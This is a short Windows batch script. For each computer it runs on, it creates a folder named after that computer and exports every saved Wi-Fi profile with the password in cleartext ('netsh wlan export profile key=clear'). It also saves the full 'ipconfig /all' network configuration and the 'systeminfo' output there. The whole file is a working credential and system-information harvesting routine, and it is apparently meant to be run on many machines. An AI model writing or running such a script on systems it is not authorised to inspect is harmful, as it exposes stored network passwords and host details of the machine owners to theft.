@echo off

mkdir Computers\%computername%\WiFi
cd Computers\%computername%

start /b netsh wlan export profile key=clear folder=WiFi

start /b ipconfig /all > ipconfig.txt
systeminfo > systeminfo.txt

exit
